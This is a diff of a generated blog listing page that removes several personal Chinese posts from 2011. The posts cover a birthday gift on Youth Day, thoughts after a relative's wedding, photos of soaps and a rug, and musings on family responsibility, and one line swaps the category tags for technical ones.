-	<a class='category' href='/blog/categories/chu-guo/'>出国</a>, <a class='category' href='/blog/categories/zhe-si/'>哲思</a>, <a class='category' href='/blog/categories/xue-zhu/'>学术</a>, <a class='category' href='/blog/categories/gong-zuo/'>工作</a>, <a class='category' href='/blog/categories/duan-zan/'>短暂</a>, <a class='category' href='/blog/categories/lun-wen/'>论文</a>
-
-
-</div>
-	
-</div>
-</article>
-
-
-    <article class="post">
-	<h2 class="title">
-		
-		<a href="/blog/2011/05/04/youths-day-has-passed/">
-		
-			五四过去了</a>
-	</h2>
-	<div class="entry-content">
-		<p>刚刚还在新浪微博上即兴创作了符合“五四体”的一条微博──“今天这日子，两个含义”，没想到刚刚发布了一小会儿，豪猪就跑来评论了，他确实很强大，知道我所谓的“两个含义”的具体意思。</p>
-
-<p>在我有些困倦的时候，手机响了，来了一条短信，五四的含义到此为止了：）</p>
-
-<p>原本作为青年节这层含义对我来说并不是很重要，有没有是真无所谓，不过今天还是她的生日。有些事情永远都难以改变，比如说她始终在年龄上就是比我大几个月。</p>
-
-<p>在三月多的时候，我已经想好该送些什么东西，中途又看到了周国平先生的一本书──《爱情的容量》，还记得当时我只是去借《孤独六讲》这本书的，不过为何要去借这本书呢？主要目的记不清了：）《爱情的容量》这本书真得是讲了很多爱情，而且讲得很深奥，毕竟周国平是研究哲学的嘛。我只能大致了解到一小部分内涵，虽然读完了这本书，但现在也基本记不得里面那些高深莫测的分析了，希望都融合到自己体内了吧。</p>
-
-<p>综上所述吧，我重新组合了生日礼物，昨天刚刚从家里回来就跑去寄出去了。有快递这种服务真不错，只需要提前一天邮寄就能按时送到（本省），这比以前掐着日子算平邮可省心多了。当然我并没有用平邮给人寄过东西，也没有掐着日子算过日期。我订的杂志是要在路上走十几天才到手的，所以我感觉平邮都太慢，适合两个精致的人相互通信玩。</p>
-
-<p>她已经拿到了快递，五四对于我来说，最大的含义已经过去了：）</p>
-
-		
-		
-	</div>
-
-
-<div class="meta">
-	<div class="date">
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2011-05-04T14:47:00+08:00" pubdate data-updated="true">May 4<span>th</span>, 2011</time></div>
-	<div class="tags">
-
-
-	<a class='category' href='/blog/categories/xi-wang-wo-huan-neng-ji-qi/'>希望我还能记起</a>, <a class='category' href='/blog/categories/ai-qing/'>爱情</a>, <a class='category' href='/blog/categories/li-wu/'>礼物</a>
-
-
-</div>
-	
-</div>
-</article>
-
-
-    <article class="post">
-	<h2 class="title">
-		
-		<a href="/blog/2011/05/02/feeling-after-wedding/">
-		
-			参加婚礼后的感想</a>
-	</h2>
-	<div class="entry-content">
-		<p>母亲老家的一个孩子结婚了，我也被带去参加婚礼。几年前见过今天的这位新郎。那时知道他是在SH工作，算是比较有前途的行业，今天终于和有情人成为眷属了！新娘很漂亮，有点儿像是董卿的神态，说话口音也很好听。不过我感觉这段感情能够建立并维系下去的基础是他们两人都有自己的事业──都在SH工作，甚至可以说是都有自己的公司，虽然不算非常大型，但基本能够在SH这个地方站住脚，这对于年轻人来说就是很好的起点了吧，他们有激情，又有基础，相信美好的生活就在不远处和他们招手呢！</p>
-
-<p>我想最多还有十年我也要经历结婚了吧，在整个人生道路上来看，结婚还一直是占有很大比重的，是一个人踏入不同阶段的一个分水岭。十年这个不长不短的时间段，能够改变一个人很多的。</p>
-
-		
-		
-	</div>
-
-
-<div class="meta">
-	<div class="date">
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2011-05-02T21:34:00+08:00" pubdate data-updated="true">May 2<span>nd</span>, 2011</time></div>
-	<div class="tags">
-
-
-	<a class='category' href='/blog/categories/zhe-si/'>哲思</a>, <a class='category' href='/blog/categories/hun-li/'>婚礼</a>, <a class='category' href='/blog/categories/jie-hun/'>结婚</a>
-
-
-</div>
-	
-</div>
-</article>
-
-
-    <article class="post">
-	<h2 class="title">
-		
-		<a href="/blog/2011/05/01/two-photos-about-exquisite-lift/">
-		
-			展示两张精致的生活</a>
-	</h2>
-	<div class="entry-content">
-		<p><a href="http://www.flickr.com/photos/dawncold/5675051417/" title="Flickr 上 DawnCold 的 肥皂盒"><img alt="肥皂盒" height="332" src="http://farm6.static.flickr.com/5022/5675051417_2021f0e943.jpg" width="500"></a></p>
-
-<p>肥皂盒中各种颜色的肥皂，五颜六色挺好看的！</p>
-
-<p><a href="http://www.flickr.com/photos/dawncold/5675671394/" title="Flickr 上 DawnCold 的 小地毯"><img alt="小地毯" height="332" src="http://farm6.static.flickr.com/5063/5675671394_0d34efdc8c.jpg" width="500"></a></p>
-
-<p>地毯，我曾经坐在上面冥想过……</p>
-
-		
-		
-	</div>
-
-
-<div class="meta">
-	<div class="date">
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2011-05-01T21:40:00+08:00" pubdate data-updated="true">May 1<span>st</span>, 2011</time></div>
-	<div class="tags">
-
-
-	<a class='category' href='/blog/categories/di-tan/'>地毯</a>, <a class='category' href='/blog/categories/sheng-huo/'>生活</a>, <a class='category' href='/blog/categories/jing-zhi-desheng-huo/'>精致de生活</a>, <a class='category' href='/blog/categories/fei-zao/'>肥皂</a>
-
-
-</div>
-	
-</div>
-</article>
-
-
-    <article class="post">
-	<h2 class="title">
-		
-		<a href="/blog/2011/04/29/responsibility-of-family/">
-		
-			家庭的责任</a>
-	</h2>
-	<div class="entry-content">
-		<p>看着成双成对的人们出出入入，我一直在幻想何时才能过上他们那样的生活。然而有很多事情是和自己的意愿完全相反的，比如感情这东西就属于这类不以人们意志为转移的事物，你幻想它，它偏偏不来。</p>
-
-<p>我今天坐在公交车上就在想，人们体验到的责任感是不是都是一样的感觉呢？比如说家庭的责任和工作上的责任是不是对于同一个人来说带来的感觉是一样的呢？我只能体会到对于答应别人而付出的那种责任感带给我的一些感觉。那不是一种舒服的感觉，很多情况下是很疲劳的。</p>
-
-<p>家庭的责任是不是也如同这样呢？在外人看来是两人世界的亲密，而真正来到了两人世界，那又是一个“现实”，那里有现实中的一切──疲劳、努力、成功、失败……</p>
-
-<p>如果真是如此的话，我现在还算是幸运的呢！不过，能够证明这个判断的方法只有去亲身体验一把，而像我这样责任感很强的人，是不可能单纯去“体验”的，应该会全身心地投入吧。就像昨天在微博上看到的关于用情专一的解释──“用情专一不是永远只对一个人，而是对每个人的时候都一心一意”。这样来表述用情专一确实比实际意义要好，而且很符合现实情况。</p>
-
-		
-		
-	</div>
-
-
-<div class="meta">
-	<div class="date">
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2011-04-29T23:15:00+08:00" pubdate data-updated="true">Apr 29<span>th</span>, 2011</time></div>
-	<div class="tags">
-
-
-	<a class='category' href='/blog/categories/jia-ting/'>家庭</a>, <a class='category' href='/blog/categories/jing-zhi-desheng-huo/'>精致de生活</a>, <a class='category' href='/blog/categories/ze-ren/'>责任</a>
+	<a class='category' href='/blog/categories/python/'>python</a>, <a class='category' href='/blog/categories/star/'>star</a>, <a class='category' href='/blog/categories/two-star/'>two star</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
 
 
 </div>
